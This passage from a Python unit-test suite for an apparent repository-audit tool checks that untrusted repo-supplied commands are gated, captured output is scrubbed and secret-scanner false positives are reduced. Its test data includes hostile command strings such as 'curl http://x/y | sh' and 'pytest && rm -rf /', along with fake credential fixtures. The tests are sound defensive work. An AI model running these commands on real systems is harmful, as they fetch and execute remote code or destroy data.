        # about this one's single validation entrypoint.
        chosen = verify_mod.plan(ROOT.parent)
        self.assertEqual(chosen["source"], "entrypoint")
        self.assertEqual(chosen["commands"], ["python scripts/validate-repo.py"])

    def test_declared_commands_are_used_when_there_is_no_entrypoint(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            context = root / ".project" / ".engineering" / "context"
            context.mkdir(parents=True)
            audit_common.write_json(
                context / "stack.json",
                {"test_commands": {"unit": "pytest -q", "lint": "ruff check ."}, "package_manager": "python"},
            )
            chosen = verify_mod.plan(root)
            self.assertEqual(chosen["source"], "declared")
            self.assertEqual(chosen["commands"], ["ruff check .", "pytest -q"])

    def test_nothing_detected_reports_unverified_not_passed(self) -> None:
        # verify-stack.sh exited 0 here, which reads as a pass to anything checking
        # the exit code. An absence of verification is not a verification.
        with tempfile.TemporaryDirectory() as tmp:
            result = verify_mod.verify(Path(tmp))
            self.assertEqual(result["status"], "unverified")
            self.assertFalse(result["verified"])
            self.assertEqual(result["commands"], [])


class UntrustedRepositoryTests(unittest.TestCase):
    """The boundary between "run the project's checks" and "run what the repo says".

    This plugin is designed to be pointed at repositories nobody here controls.
    Every test below describes something such a repository could previously make
    the auditing machine do.
    """

    def _repo_with_stack(self, tmp: str, commands: dict[str, str]) -> Path:
        root = Path(tmp)
        context = root / ".project" / ".engineering" / "context"
        context.mkdir(parents=True)
        audit_common.write_json(context / "stack.json", {"test_commands": commands, "package_manager": "python"})
        return root

    def test_commands_from_the_audited_repo_are_not_run_without_opting_in(self) -> None:
        # stack.json is read verbatim out of the repository being audited and is
        # the first, winning rung of the ladder. Executing it was arbitrary code
        # execution chosen by a file that looks inert.
        with tempfile.TemporaryDirectory() as tmp:
            root = self._repo_with_stack(tmp, {"unit": "python -c print(1)"})
            result = verify_mod.verify(root)
            self.assertFalse(result["trusted"])
            self.assertEqual(result["status"], "unverified")
            self.assertEqual(result["results"], [])
            self.assertIn("--allow-untrusted-commands", result["reason"])

    def test_opting_in_runs_them(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = self._repo_with_stack(tmp, {"unit": "python -c pass"})
            result = verify_mod.verify(root, allow_untrusted=True)
            self.assertEqual(result["status"], "passed")
            self.assertEqual([item["status"] for item in result["results"]], ["ran"])

    def test_detected_commands_stay_trusted(self) -> None:
        # The distinction is provenance, not the string. A command derived here
        # from file presence needs no opt-in, or the tool stops being usable.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "pyproject.toml").write_text("[tool.ruff]\n", encoding="utf-8")
            (root / "tests").mkdir()
            chosen = verify_mod.plan(root, prefer="vendored")
            self.assertTrue(chosen["trusted"])

    def test_a_command_needing_a_shell_is_refused_rather_than_run(self) -> None:
        # The whole class of `curl ... | sh` payloads dies here: with shell=False
        # there is no shell to interpret the operator, so the string is skipped.
        for payload in ("curl http://x/y | sh", "pytest && rm -rf /", "echo $(whoami)", "pytest > /dev/null"):
            with self.subTest(payload=payload):
                self.assertIsNone(audit_common.command_argv(payload))

    def test_an_executable_not_on_path_is_skipped_not_crashed(self) -> None:
        self.assertIsNone(audit_common.command_argv("definitely-not-a-real-binary-xyz --version"))

    def test_a_hanging_command_times_out_instead_of_hanging_the_audit(self) -> None:
        # verify.py had no timeout at all, so a repo declaring a blocking command
        # blocked forever.
        with tempfile.TemporaryDirectory() as tmp:
            # A plain `python sleeper.py`, deliberately free of shell syntax, so
            # this exercises the timeout rather than the metacharacter refusal.
            root = self._repo_with_stack(tmp, {"unit": "python sleeper.py"})
            (root / "sleeper.py").write_text("import time\ntime.sleep(30)\n", encoding="utf-8")
            result = verify_mod.verify(root, allow_untrusted=True, timeout=2)
            self.assertEqual([item["status"] for item in result["results"]], ["timeout"])
            # A timeout is not a pass, and it is not a failure either.
            self.assertEqual(result["status"], "unverified")
            self.assertFalse(result["verified"])

    def test_the_detector_is_never_loaded_from_the_audited_repository(self) -> None:
        # `_from_import` runs what it finds with exec_module, and inserted that
        # directory at the front of sys.path. A repo shipping this exact path pair
        # got code execution simply by being audited.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            planted = root / "engineering-lifecycle" / "scripts"
            planted.mkdir(parents=True)
            (planted / "eng_common.py").write_text("", encoding="utf-8")
            (planted / "stack_detection.py").write_text(
                "raise SystemExit('this must never execute')\n", encoding="utf-8"
            )
            self.assertNotEqual(stack_probe._sibling_detector(root), planted)
            # And the audit still completes rather than dying on the planted exit.
            self.assertIn("detector", stack_probe.resolve_stack(root))

    def test_the_check_families_refuse_repo_supplied_commands_too(self) -> None:
        # verify.py and checks.py are two doors into the same room. Gating one and
        # not the other would leave the vector open through `/plan-completion-audit`,
        # which is the entrypoint people actually use.
        base = {"frameworks": [], "backend": [], "database": [], "testing": []}
        family = next(f for f in families.REGISTRY if f.id == "tests")
        stack = {**base, "detector": "workspace", "test_commands": {"unit": "python -c pass"}}
        ctx = families.Ctx(root=Path("."), stack=stack, plan={"parsed_by": None}, files=[])
        self.assertTrue(ctx.commands_are_repo_supplied)
        result = checks.run_command_family(ctx, family, ("unit",), "critical")
        self.assertEqual(result.outcome, "not-checked")
        # The reason names the command, so somebody can look before allowing it.
        self.assertIn("python -c pass", result.reason)

        allowed = families.Ctx(
            root=Path("."), stack=stack, plan={"parsed_by": None}, files=[], allow_untrusted_commands=True
        )
        self.assertNotEqual(checks.run_command_family(allowed, family, ("unit",), "critical").outcome, "not-checked")

    def test_captured_output_is_scrubbed_before_it_reaches_an_artifact(self) -> None:
        # findings.json and report.md persist command output verbatim, and a
        # failing build routinely prints a token or a connection string.
        scrubbed = audit_common.scrub_secrets(
            "connecting to postgres://admin:hunter2@db.internal/app\nAKIAIOSFODNN7EXAMPLE\n"
        )
        self.assertNotIn("hunter2", scrubbed)
        self.assertNotIn("AKIAIOSFODNN7EXAMPLE", scrubbed)
        self.assertIn("admin", scrubbed)


class CapturedOutputTests(unittest.TestCase):
    """Output a child process emits must reach the audit, or the audit must say so.

    On Windows `text=True` alone decodes with the ANSI codepage, and cp1252 leaves
    0x81, 0x8D, 0x8F, 0x90 and 0x9D undefined. One such byte killed the reader
    thread; `is_alive()` was then false so no TimeoutExpired was raised, the buffer
    stayed empty, and `subprocess.run` returned `stdout=None` with the real exit
    code. Every caller wrote `(proc.stdout or "")`, so a total loss of evidence was
    indistinguishable from a command that printed nothing - and two families
    reported `passed` on it.
    """

    # Emits the exact byte from the crash report, plus a real multi-byte character,
    # straight to the buffer so no encoding on the child's side can launder it.
    _EMITTER = (
        "import sys\n"
        "sys.stdout.buffer.write(b'before\\x90after ')\n"
        "sys.stdout.buffer.write('caf\\u00e9 \\u2014 \\u4f60\\u597d'.encode())\n"
        "sys.stdout.buffer.flush()\n"
    )

    def _emitter_repo(self, tmp: str) -> Path:
        root = Path(tmp)
        (root / "emit.py").write_text(self._EMITTER, encoding="utf-8")
        return root

    def test_an_undecodable_byte_does_not_lose_the_whole_capture(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = self._emitter_repo(tmp)
            captured = audit_common.run_command("python emit.py", root)
            self.assertEqual(captured.exit, 0)
            self.assertTrue(captured.captured)
            self.assertTrue(captured.ok)
            # The undecodable byte degrades to the replacement character. Everything
            # around it survives, which is the whole point of errors="replace".
            self.assertIn("before", captured.stdout)
            self.assertIn("after", captured.stdout)
            self.assertIn("café", captured.stdout)
            self.assertIn("你好", captured.stdout)

    def test_a_listing_survives_the_same_byte(self) -> None:
        # `_lines` feeds collect_files and repo-hygiene. It was the site whose
        # silent empty return widened the audit's file scope.
        with tempfile.TemporaryDirectory() as tmp:
            root = self._emitter_repo(tmp)
            self.assertTrue(checks._lines("python emit.py", root))

    def test_a_lost_capture_is_errored_rather_than_a_clean_pass(self) -> None:
        # The guard, not the decode: force `captured=False` and assert the two
        # families that used to manufacture a pass out of it no longer can.
        lost = audit_common.Captured(
            cmd="git ls-files", exit=0, captured=False, error="the output of this command could not be read"
        )
        family = next(f for f in families.REGISTRY if f.id == "repo-hygiene")
        with (
            tempfile.TemporaryDirectory() as tmp,
            mock.patch.object(checks, "_listing", return_value=lost),
        ):
            root = Path(tmp)
            (root / ".git").mkdir()
            ctx = families.Ctx(root=root, stack={}, plan={"parsed_by": None}, files=[])
            result = checks.run_repo_hygiene(ctx, family)
        self.assertEqual(result.outcome, "errored")
        self.assertTrue(result.reason.strip(), "an errored outcome must state a reason")
        self.assertIn("could not be read", result.reason)

    def test_a_failed_listing_warns_that_the_file_scope_widened(self) -> None:
        # The fallback walk does not read .gitignore, so it is a correct answer for
        # a plain directory and a silently wrong one for a repo whose listing broke.
        lost = audit_common.Captured(cmd="git ls-files", exit=128, captured=True, stdout="")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "a.py").write_text("x = 1\n", encoding="utf-8")

            files, warning = checks.collect_files(root)
            self.assertEqual(warning, "", "a directory that is not a repository is not a warning")

            (root / ".git").mkdir()
            with mock.patch.object(checks, "_listing", return_value=lost):
                files, warning = checks.collect_files(root)
        self.assertTrue(files, "the walk still answers")
        self.assertIn(".gitignore", warning)

    def test_no_command_family_treats_a_lost_capture_as_a_result(self) -> None:
        # Swept rather than fixed one at a time: every runner that reads `_run`'s exit
        # code has to refuse to believe it when the output that explains it was lost.
        # `tests` is the one that matters most - a green suite nobody read is the most
        # expensive false pass this tool can produce.
        lost = {"cmd": "pnpm test", "exit": 0, "captured": False, "error": "output could not be read", "output": ""}
        stack = {"detector": "vendored", "test_commands": {"unit": "pnpm test"}, "package_manager": "npm"}
        ctx = families.Ctx(root=Path("."), stack=stack, plan={"parsed_by": None}, files=[])
        with mock.patch.object(checks, "_run", return_value=lost):
            tests = checks.run_command_family(ctx, families.BY_ID["tests"], ("unit",), "critical")
            deps = checks.run_dependency_audit(ctx, families.BY_ID["dependency-audit"])
        for result in (tests, deps):
            with self.subTest(family=result.id):
                self.assertEqual(result.outcome, "errored")
                self.assertTrue(result.reason.strip())

    def test_a_reference_checker_that_printed_nothing_is_not_a_docs_pass(self) -> None:
        # Empty output parsed as `{}`, so `checked` defaulted True and `errors`
        # defaulted empty: a lost capture rendered as "markdown documents are
        # present" with a PASSED verdict.
        family = next(f for f in families.REGISTRY if f.id == "docs-references")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            planted = root / "engineering-lifecycle" / "scripts"
            planted.mkdir(parents=True)
            (planted / "reference-check.py").write_text("", encoding="utf-8")
            ctx = families.Ctx(root=root, stack={}, plan={"parsed_by": None}, files=[])
            with mock.patch.object(checks, "_run", return_value={"cmd": "ref", "exit": 0, "output": ""}):
                result, unresolved = run_audit._reference_findings(ctx, family)
        self.assertEqual(result.outcome, "errored")
        self.assertTrue(result.reason.strip())
        self.assertEqual(unresolved, set())


class LifecycleResolutionTests(unittest.TestCase):
    """WEB-404: `docs-references` skipped itself on a claim that was not true.

    It reported "engineering-lifecycle is not installed alongside this plugin" on a
    machine with ten versions of it installed. The probe used
    `<plugin>/../engineering-lifecycle/...`, which resolves only in this repository's
    own checkout. Installed, a plugin runs from
    `~/.claude/plugins/cache/<marketplace>/<plugin>/<version>/`, so `..` pointed
    inside ai-utilities and skipped the version segment entirely.
    """

    def _fake_install(self, tmp: str, versions: tuple[str, ...]) -> Path:
        cache = Path(tmp) / "cache" / "johns-os"
        (cache / "ai-utilities" / "0.2.1" / "scripts").mkdir(parents=True)
        for version in versions:
            target = cache / "engineering-lifecycle" / version / "scripts"
            target.mkdir(parents=True)
            (target / "reference-check.py").write_text("", encoding="utf-8")
        return cache

    def test_the_source_checkout_layout_still_resolves(self) -> None:
        found, _tried = audit_common.resolve_lifecycle_file("scripts", "reference-check.py")
        self.assertIsNotNone(found, "this repository has engineering-lifecycle as a sibling")
        self.assertTrue(found.is_file())

    def test_the_installed_layout_resolves_and_prefers_the_newest_version(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            cache = self._fake_install(tmp, ("0.4.0", "0.9.0", "0.10.0", "0.10.4"))
            with mock.patch.object(audit_common, "plugin_root", return_value=cache / "ai-utilities" / "0.2.1"):
                found, tried = audit_common.resolve_lifecycle_file("scripts", "reference-check.py")
        self.assertIsNotNone(found)
        # `0.10.4` beats `0.9.0`, which string ordering gets backwards.
        self.assertEqual(found.parent.parent.name, "0.10.4")
        # The first path tried is the one that used to be the only path tried.
        self.assertIn("ai-utilities", str(tried[0]))

    def test_versions_sort_numerically_not_lexically(self) -> None:
        self.assertGreater(audit_common._version_key("0.10.4"), audit_common._version_key("0.9.0"))
        self.assertGreater(audit_common._version_key("1.0.0"), audit_common._version_key("0.99.99"))

    def test_a_genuine_absence_names_the_paths_tried(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "cache" / "johns-os" / "ai-utilities" / "0.2.1"
            root.mkdir(parents=True)
            with mock.patch.object(audit_common, "plugin_root", return_value=root):
                found, tried = audit_common.resolve_lifecycle_file("scripts", "reference-check.py")
        self.assertIsNone(found)
        self.assertTrue(tried, "a failure must be able to say what it looked for")

    def test_the_docs_family_reason_does_not_assert_an_installation_fact(self) -> None:
        family = next(f for f in families.REGISTRY if f.id == "docs-references")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            ctx = families.Ctx(root=root, stack={}, plan={"parsed_by": None}, files=[])
            with mock.patch.object(run_audit, "resolve_lifecycle_file", return_value=(None, [Path("a"), Path("b")])):
                result, _unresolved = run_audit._reference_findings(ctx, family)
        self.assertEqual(result.outcome, "not-checked")
        self.assertIn("could not locate", result.reason)
        self.assertIn("Tried:", result.reason)
        self.assertNotIn("is not installed", result.reason)

    def test_the_stack_ladder_uses_the_same_resolution(self) -> None:
        # The `imported` rung had the identical defect, so it could never fire off a
        # real install either.
        with tempfile.TemporaryDirectory() as tmp:
            cache = Path(tmp) / "cache" / "johns-os"
            (cache / "ai-utilities" / "0.2.1" / "scripts").mkdir(parents=True)
            planted = cache / "engineering-lifecycle" / "0.10.4" / "scripts"
            planted.mkdir(parents=True)
            (planted / "stack_detection.py").write_text("", encoding="utf-8")
            (planted / "eng_common.py").write_text("", encoding="utf-8")
            with mock.patch.object(audit_common, "plugin_root", return_value=cache / "ai-utilities" / "0.2.1"):
                self.assertEqual(stack_probe._sibling_detector(Path(".")), planted)

    def test_the_audited_repository_is_still_never_a_detector_source(self) -> None:
        # The security property from WEB-382 must survive this change: install
        # locations only, never a directory inside the repo under audit.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            planted = root / "engineering-lifecycle" / "scripts"
            planted.mkdir(parents=True)
            (planted / "stack_detection.py").write_text("raise SystemExit('never')\n", encoding="utf-8")
            (planted / "eng_common.py").write_text("", encoding="utf-8")
            self.assertNotEqual(stack_probe._sibling_detector(root), planted)


class DeadCodeGatingTests(unittest.TestCase):
    """WEB-404, second half: the family was filed under the wrong outcome.

    `applies_when` admitted any Node tree, the runner implemented only Python, so a
    TypeScript repository passed the relevance gate and got `not-checked` - "applies
    here but could not run" - when the truth was `not-applicable`. The registry keeps
    two predicates so exactly that distinction cannot collapse.
    """

    def _ctx(self, **stack) -> families.Ctx:
        base = {"frameworks": [], "backend": [], "database": [], "testing": [], "test_commands": {}}
        return families.Ctx(root=Path("."), stack={**base, **stack}, plan={"parsed_by": None}, files=[])

    def test_a_typescript_repo_is_not_applicable_rather_than_not_checked(self) -> None:
        family = families.BY_ID["dead-code"]
        relevant, why = family.applies_when(self._ctx(frameworks=["Astro", "React"]))
        self.assertFalse(relevant)
        self.assertIn("only implemented for Python", why)

    def test_a_python_repo_still_applies(self) -> None:
        family = families.BY_ID["dead-code"]
        relevant, why = family.applies_when(self._ctx(backend=["Python"]))
        self.assertTrue(relevant)
        self.assertIn("Python", why)

    def test_the_gate_and_the_runner_agree(self) -> None:
        # The invariant the bug violated. If these two ever disagree again, the runner
        # now reports `errored` - a bug in the registry, not a fact about the repo.
        family = families.BY_ID["dead-code"]
        for stack in ({"frameworks": ["React"]}, {"backend": ["Python"]}, {"backend": ["Go"]}, {}):
            with self.subTest(stack=stack):
                ctx = self._ctx(**stack)
                relevant, _why = family.applies_when(ctx)
                if relevant:
                    self.assertNotEqual(checks.run_dead_code(ctx, family).outcome, "errored")


class SecretsTests(unittest.TestCase):
    """WEB-401: every finding in the secrets family was a false positive.

    Six of the run's seven criticals, all test-file literals, five of which said in
    the value itself that they were not real. A scanner with a 100% false-positive
    rate on a repository is worse than no scanner, because it consumes the attention
    a real finding needs - and the seventh finding on that run was real.
    """

    # Exactly the six from the issue, at their real paths.
    FALSE_POSITIVES = (
        ("api/src/api.leads.test.ts", "      secret: 'not-a-real-token',"),
        ("api/src/api.leads.test.ts", "      secret: 'SUPER-SECRET-TOKEN',"),
        ("api/src/api.report.test.ts", "  const s = 'a-test-signing-secret-that-is-long-enough';"),
        ("api/src/api.test.ts", "  const SECRET = 'test-secret-not-a-real-key';"),
        ("api/src/report/sending-identity.test.ts", "      secret: 'not-a-real-value',"),
        ("e2e/E2-report-reaches-recipient.py", 'SECRET = "poolslip-report-link-secret"'),
    )

    def _scan(self, files: dict[str, str], root_name: str = "repo") -> list:
        family = next(f for f in families.REGISTRY if f.id == "secrets")
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / root_name
            paths = []
            for relative, content in files.items():
                target = root / relative
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(content + "\n", encoding="utf-8")
                paths.append(target)
            ctx = families.Ctx(root=root, stack={}, plan={"parsed_by": None}, files=paths)
            return checks.run_secrets(ctx, family).findings

    def test_none_of_the_six_is_reported_as_critical(self) -> None:
        for relative, line in self.FALSE_POSITIVES:
            with self.subTest(line=line.strip()):
                found = self._scan({relative: line})
                self.assertNotIn(
                    "critical",
                    [item.severity for item in found],
                    f"{line.strip()} must not be a critical finding",
                )

    def test_a_real_credential_in_production_source_still_fires(self) -> None:
        # The point of down-weighting rather than deleting the check.
        found = self._scan({"src/deploy.ts": "const key = 'AKIAIOSFODNN7EXAMPLE';"})
        self.assertEqual([item.severity for item in found], ["critical"])

    def test_a_high_entropy_assignment_in_production_source_still_fires(self) -> None:
        found = self._scan({"src/config.ts": "const apiKey = 'xJ8kQ2mZ9pL4vR7tY1wS6nD3cF5gH0bA';"})
        self.assertEqual([item.severity for item in found], ["critical"])

    def test_a_real_credential_in_a_test_file_is_kept_but_down_weighted(self) -> None:
        # Not dropped: a live key committed to a test file is still committed. The
        # literal here is shaped like a key and says nothing about being fake.
        found = self._scan({"src/api.test.ts": "const key = 'AKIAQ7ZK3MRPX2WNFJ4D';"})
        self.assertEqual([item.severity for item in found], ["suggestion"])
        self.assertIn("test or example material", found[0].title)

    def test_a_self_declaring_fixture_in_a_test_file_is_dropped(self) -> None:
        # `AKIAIOSFODNN7EXAMPLE` is AWS's own published example key. In a file that
        # already declares itself a fixture, a value that also says it is not real is
        # not evidence - and this repo's own suites are full of them, so keeping them
        # would trade six false criticals for sixteen false suggestions.
        self.assertEqual(self._scan({"src/api.test.ts": "const key = 'AKIAIOSFODNN7EXAMPLE';"}), [])
        self.assertEqual(
            self._scan({"tests/t.py": 'FAKE_PEM = "-----BEGIN RSA PRIVATE KEY-----"'}),
            [],
        )

    def test_the_same_fixture_literal_in_production_source_still_fires(self) -> None:
        # The narrowing is to test paths only. Production source is never
        # second-guessed on the shape-specific patterns, where a false negative costs.
        found = self._scan({"src/deploy.ts": "const key = 'AKIAIOSFODNN7EXAMPLE';"})
        self.assertEqual([item.severity for item in found], ["critical"])

    def test_a_test_filename_outside_a_test_directory_is_recognised(self) -> None:
        # `api.leads.test.ts` sits in `api/src/`, so the old component-only filter
        # never saw it. Four of the six got through exactly here.
        found = self._scan({"api/src/api.leads.test.ts": "const key = 'AKIAQ7ZK3MRPX2WNFJ4D';"})
        self.assertEqual([item.severity for item in found], ["suggestion"])

    def test_a_checkout_under_a_path_named_tests_is_still_scanned(self) -> None:
        # `ctx.files` holds absolute paths, so matching components of the absolute
        # path meant a repo at `C:\dev\tests\myrepo` skipped the whole scan.
        found = self._scan({"src/deploy.ts": "const key = 'AKIAIOSFODNN7EXAMPLE';"}, root_name="tests")
        self.assertEqual([item.severity for item in found], ["critical"])

    def test_a_secret_manager_resource_name_is_not_a_value(self) -> None:
        # F007, the interesting one: a resource name passed to `gcloud --secret=` to
        # fetch the real value at runtime, matching a whole repo of sibling names.
        found = self._scan({"scripts/deploy.py": 'SECRET = "poolslip-report-link-secret"'})
        self.assertEqual(found, [])

    def test_a_tracked_env_file_is_still_a_finding(self) -> None:
        found = self._scan({".env": "TOKEN=whatever"})
        self.assertIn("secret/tracked-env", [item.rule for item in found])

    def test_the_rule_names_did_not_change(self) -> None:
        # `identity` hashes `rule`, so renaming one re-keys every filed tracker issue
        # and duplicates it on the next run.
        self.assertEqual(
            [rule for rule, _pattern, _label in audit_common.SECRET_PATTERNS],
            [
                "aws-access-key",
                "private-key",
                "stripe-secret",
                "slack-token",
                "github-token",
                "anthropic-key",
                "openai-key",
                "generic-assignment",
            ],
        )


class PackageManagerTests(unittest.TestCase):
    def test_the_detected_manager_is_the_one_the_commands_use(self) -> None:
        # The manager was resolved and then discarded, so every JS repo got
        # `npm test` - which on a pnpm or yarn project either fails or installs a
        # divergent dependency tree.
        for lockfile, manager in (("pnpm-lock.yaml", "pnpm"), ("yarn.lock", "yarn"), ("bun.lockb", "bun")):
            with self.subTest(manager=manager), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                (root / lockfile).write_text("", encoding="utf-8")
                audit_common.write_json(root / "package.json", {"scripts": {"test": "x", "build": "y"}})
                stack = stack_probe.resolve_stack(root, prefer="vendored")
                self.assertEqual(stack["package_manager"], manager)
                for command in stack["test_commands"].values():
                    self.assertTrue(command.startswith(manager), command)

    def test_bun_runs_the_script_rather_than_its_own_test_runner(self) -> None:
        # `bun test` is bun's built-in runner and ignores the package.json script.
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "bun.lockb").write_text("", encoding="utf-8")
            audit_common.write_json(root / "package.json", {"scripts": {"test": "vitest"}})
            stack = stack_probe.resolve_stack(root, prefer="vendored")
            self.assertEqual(stack["test_commands"]["unit"], "bun run test")


if __name__ == "__main__":
    unittest.main()
